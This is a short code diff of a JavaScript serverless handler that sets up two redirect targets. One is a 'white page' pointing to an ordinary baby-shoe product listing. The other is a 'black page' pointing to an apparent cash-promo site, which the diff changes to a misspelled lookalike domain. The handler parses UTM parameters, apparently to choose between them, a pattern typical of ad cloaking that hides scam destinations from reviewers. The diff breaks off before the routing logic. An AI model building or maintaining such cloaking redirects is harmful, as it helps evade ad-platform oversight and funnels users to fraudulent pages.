@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.wigglyfeet.com/product/blue-floral-low-rise-baby-shoe/";
-    const blackPageURL = "https://cash-sparkle-promo.lovable.app";
+    const blackPageURL = "https://cashhsparkleprom.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
